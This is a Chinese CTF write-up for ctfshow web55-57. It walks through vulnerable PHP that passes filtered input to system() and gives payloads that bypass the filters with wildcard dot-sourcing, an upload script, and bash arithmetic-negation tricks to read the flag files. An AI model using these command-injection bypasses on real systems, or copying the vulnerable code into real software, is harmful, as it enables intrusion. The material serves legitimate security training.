@[toc](文章目录)

##  web55-56

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

首先使用点号.来执行命令，跟source命令相同的

参考：[source命令](https://zhuanlan.zhihu.com/p/357335122#:~:text=%E5%AF%BC%E8%AF%BB%EF%BC%9A%20source%E5%91%BD%E4%BB%A4%E6%98%AF%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%9A%84shell%E5%91%BD%E4%BB%A4%EF%BC%8C%E7%94%A8%E4%BA%8E%E4%BB%8E%E5%BD%93%E5%89%8Dshell%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E3%80%82,source%E5%91%BD%E4%BB%A4%E9%80%9A%E5%B8%B8%E7%94%A8%E4%BA%8E%E4%BF%9D%E7%95%99%E3%80%81%E6%9B%B4%E6%94%B9%E5%BD%93%E5%89%8Dshell%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E3%80%82%20%E7%AE%80%E8%80%8C%E8%A8%80%E4%B9%8B%EF%BC%8Csource%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%B0%86%E4%BC%9A%E5%9C%A8%E5%BD%93%E5%89%8Dshell%E4%B8%AD%E8%BF%90%E8%A1%8Cexecute%E5%91%BD%E4%BB%A4%E3%80%82%20source%E5%91%BD%E4%BB%A4%E5%AE%83%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%8F%90%E4%BE%9B%E4%BA%86%E5%8F%82%E6%95%B0%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%86%E7%94%A8%E4%BD%9C%E4%BC%A0%E9%80%92%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E3%80%82)

使用通配符来构造文件路径。

参考：

[p神的文章]([无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html))

[进阶](https://wh0ale.github.io/2019/01/13/2019-1-13-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/)

payload

```
c=.+/???/????????[@-[],其中+表示空格，.执行命令。[@-[]是定位字母
```

脚本跑

```python
import requests

while True:
    url = "http://6c925e5e-f607-4a59-9bbd-2302926e1239.challenge.ctf.show:8080/?c=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})
    if r.text.find("ctfshow") >0:
        print(r.text)
        break
```









##  web57

代码显示

```php
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

这道题禁用了通配符和字母数字

我们可以使用$()来构造

```
$(()) 代表做一次运算，因为里面为空，也表示值为0
$((~$(()))) 对0作取反运算，值为-1
$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2
$((~$(($((~$(())))$((~$(()))))))) 再对-2做一次取反得到1，所以值为1

如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1
参考：
取反操作https://www.runoob.com/python3/python3-basic-operators.html
$()构造命令执行：https://www.cnblogs.com/chenpython123/p/11052276.html
```

所有我们只需要构造出-37，然后取反就可以得到结果。

```python
data = "$((~$(("+"$((~$(())))"*37+"))))"
print(data)
```

payload

```
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

